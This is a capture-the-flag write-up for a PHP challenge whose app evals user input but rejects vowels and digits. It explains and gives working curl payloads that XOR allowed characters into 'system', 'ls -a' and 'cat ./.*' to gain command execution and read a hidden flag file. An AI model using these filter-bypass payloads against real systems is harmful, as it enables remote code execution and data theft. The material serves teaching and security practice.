# Lipogramme PHP ‚Äì RCE Without Vowels (CTF Writeup)

> Remote Code Execution in a PHP app that forbids **vowels** and **digits** in user input.

---

## üß© Challenge Description

The service runs on:

```text
http://localhost:8000/
```

Visiting it without parameters shows us the source code:

```php
<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
```

So the logic is:

1. Read `$_GET['code']` (up to 250 chars).
2. If `code` contains any vowel or any digit ‚Üí `No way! Go away!`.
3. Otherwise ‚Üí `eval($code)`.
4. If `eval` throws a `ParseError` ‚Üí also `No way! Go away!`.
5. Without `code` ‚Üí show the source.

The goal: **achieve RCE via `eval` despite the character filter** and recover a flag hidden somewhere in the webroot.

---

## üîç Filter Analysis

The filter is:

```php
preg_match('/a|e|i|o|u|y|[0-9]/i', $code)
```

### ‚ùå Blocked (case-insensitive)

- Vowels: `a e i o u y`
- Digits: `0 1 2 3 4 5 6 7 8 9`

So this is illegal in `code=`:

```php
system("ls");      // contains e, i
print(123);        // contains i and digits
echo "hello";      // contains e, o
```

### ‚úÖ Allowed

- Consonants:  
  `b c d f g h j k l m n p q r s t v w x z` (upper + lower)
- Symbols (non-exhaustive):  
  `! @ # $ % ^ & * ( ) - _ = + [ ] { } ; : ' " , . / ? \` < >|`
- PHP syntax using only those characters:
  - variables: `$x`, `$fn`, `$cmd`, ‚Ä¶
  - concatenation: `.`
  - bitwise ops: `^`, `&`, `|`
  - function calls (as long as you can spell them)

**Important:**  

The filter looks at the **literal text** of `code`, not at the values computed at runtime.  
So if we can generate forbidden characters (like vowels) dynamically using allowed characters (e.g. via XOR), the filter will never see them.

---

## üß™ First Steps ‚Äì Understanding Behavior

Because of:

```php
try {
    eval($code);
} catch (ParseError $e) {
    die('No way! Go away!');
}
```

We see `No way! Go away!` for two reasons:

1. Filter matched (vowel/digit).
2. `eval()` got invalid PHP code.

So:

- `No way! Go away!` ‚â† ‚Äúfilter only‚Äù
- It can also mean ‚Äúsyntax error‚Äù

### ‚úÖ Example: valid, consonant-only PHP

```text
?code=$x=$x;
```

- No vowels, no digits ‚Üí passes regex.
- Valid PHP ‚Üí no `ParseError`.
- No output ‚Üí blank page.

This confirms:

- Our input reaches `eval`.
- We can execute arbitrary PHP, as long as it is syntactically valid and vowel/digit-free **in the source**.

---

## üß† High-Level Exploit Strategy

What we want to run (conceptually):

```php
system("ls -a");
system("cat ./.*");
```

But we cannot type:

- `system` (contains `e`, `y`)
- `ls -a` (contains `a`)
- `cat` (contains `a`)
- digits (no `chr(97)` style tricks)

So the plan:

1. **Build forbidden strings at runtime** using allowed characters.
2. Use those strings as:
   - function names (`"system"`)
   - command strings (`"ls -a"`, `"cat ./.*"`)
3. Call the function via a variable:

   ```php
   $fn($cmd); // e.g., system("ls -a")
   ```

---

## üß∑ Key Primitive: String XOR in PHP

PHP lets us XOR strings:

```php
"H" ^ ";"
```

XORs the ASCII codes of the characters and returns a new character.

Example logic:

- `"H"` = 72
- `";"` = 59
- `72 ^ 59 = 115`
- `115` = `'s'`

So:

```php
"H"^";"  // "s"
```

By carefully choosing pairs of allowed characters, we can generate:

- vowels (`a, e, i, o, u, y`)
- spaces
- punctuation
- any other ASCII characters

The **filter sees only the input** (e.g., `"H"` and `";"`), which are allowed.  
The XOR result is computed later, out of the filter‚Äôs reach.

---

## üß± Step 1 ‚Äì Build `"system"` via XOR

We define:

```php
$fn = ("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");
```

Let‚Äôs decode each piece:

| Expression  | ASCII left | ASCII right | XOR  | Char |
|-------------|------------|-------------|------|------|
| `"H"^";"`   | 72         | 59          | 115  | `s`  |
| `"B"^";"`   | 66         | 59          | 121  | `y`  |
| `"H"^";"`   | 72         | 59          | 115  | `s`  |
| `"H"^"<"`   | 72         | 60          | 116  | `t`  |
| `"D"^"!""`  | 68         | 33          | 101  | `e`  |
| `"B"^"/"`   | 66         | 47          | 109  | `m`  |

So:

```php
$fn = "s" . "y" . "s" . "t" . "e" . "m";  // "system"
```

The filter sees only uppercase letters and symbols.  
At runtime, we have the forbidden string `"system"` in `$fn`.

We can now call:

```php
$fn($cmd);  // system($cmd)
```

because in PHP, variable function calls are allowed.

---

## üóÇ Step 2 ‚Äì Build `"ls -a"` via XOR

We want to see all files, including hidden ones:

```text
ls -a
```

We construct this as:

```php
$cmd = ("B"^".").("H"^";").("z"^"Z").("{"^"V").("#"^"B");
```

Decode:

| Expression  | Char |
|-------------|------|
| `"B"^"."`   | `l`  |
| `"H"^";"`   | `s`  |
| `"z"^"Z"`   | ` ` (space) |
| `"{"^"V"`   | `-`  |
| `"#"^"B"`   | `a`  |

So:

```php
$cmd = "l" . "s" . " " . "-" . "a";  // "ls -a"
```

Combine:

```php
$fn  = "system";
$cmd = "ls -a";
$fn($cmd);  // system("ls -a");
```

### ‚úÖ Payload: run `ls -a`

Using `curl`:

```bash
curl 'http://localhost:8000/'   --get   --data-urlencode 'code=$fn=("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");$cmd=("B"^".").("H"^";").("z"^"Z").("{"^"V").("#"^"B");$fn($cmd);'
```

Output (example):

```text
.
..
index.php
.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
```

We‚Äôve now discovered a hidden file in the webroot that almost certainly contains the flag.

---

## üìú Step 3 ‚Äì Build `"cat ./.*"` via XOR

To dump hidden files in the current directory:

```text
cat ./.*
```

We again use XOR:

```php
$cmd = ("@"^"#").("#"^"B").("%"^"Q").("z"^"Z").("B"^"l").("x"^"W").("B"^"l").("Z"^"p");
```

Decode:

| Expression  | Char |
|-------------|------|
| `"@"^"#"`   | `c`  |
| `"#"^"B"`   | `a`  |
| `"%"^"Q"`   | `t`  |
| `"z"^"Z"`   | ` ` (space) |
| `"B"^"l"`   | `.`  |
| `"x"^"W"`   | `/`  |
| `"B"^"l"`   | `.`  |
| `"Z"^"p"`   | `*`  |

So:

```php
$cmd = "c" . "a" . "t" . " " . "." . "/" . "." . "*";  // "cat ./.*"
```

With `$fn = "system";` as before:

```php
$fn($cmd);  // system("cat ./.*");
```

### ‚úÖ Payload: dump hidden files (including the flag)

```bash
curl 'http://localhost:8000/'   --get   --data-urlencode 'code=$fn=("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");$cmd=("@"^"#").("#"^"B").("%"^"Q").("z"^"Z").("B"^"l").("x"^"W").("B"^"l").("Z"^"p");$fn($cmd);'
```

This prints the contents of all hidden files in the current directory, including:

```text
.flag.inside.J44kYHYL3asgsU7R9zHWZXbRWK7JjF7E.php
```

Inside that file, you‚Äôll find the flag (e.g. an `FCSC{...}`-style flag).

---

## ‚úÖ Summary of the Exploit

1. **Understand the filter**: vowels and digits are blacklisted, but only in raw input.
2. **Confirm code execution** with a simple payload:
   ```text
   ?code=$x=$x;
   ```
3. **Use XOR** to generate any character (including vowels and spaces) at runtime:
   ```php
   "H"^";"  // "s"
   ```
4. **Build `"system"` dynamically**:
   ```php
   $fn=("H"^";").("B"^";").("H"^";").("H"^"<").("D"^"!").("B"^"/");
   ```
5. **Build your command strings dynamically**:
   - `ls -a`
   - `cat ./.*`
6. **Execute them via variable function calls**:
   ```php
   $fn($cmd);  // system($cmd);
   ```
7. Dump the hidden flag file and capture the flag.

---

## üö® Lessons Learned

- **Never use `eval()` on user input.**  
  Even with ‚Äúsmart‚Äù filters, it‚Äôs basically RCE waiting to happen.
- **Blacklisting characters is not a safe sandbox.**  
  As long as bitwise operators and basic syntax are available, you can almost always reconstruct forbidden bytes.
- **Runtime vs. source:**  
  The filter sees what you type, not what PHP computes. Think in terms of:
  > ‚ÄúCan I *make* the value I want *later*?‚Äù
- **XOR and `chr()` tricks are powerful** in CTFs where some characters are restricted.

---

## üß™ Optional: Running the Challenge Locally

If you want to reproduce the environment with Docker (like in many CTF setups):

```bash
docker run -d   -p 8000:80   --name lipogramme   anssi/fcsc2020-web-lipogrammeurs:latest
```

Then visit:

```text
http://localhost:8000/
```

And launch the payloads as shown above.

---

Happy hacking üöÄ  
Feel free to fork this repo and adapt the technique to other ‚Äúrestricted charset‚Äù CTF challenges.
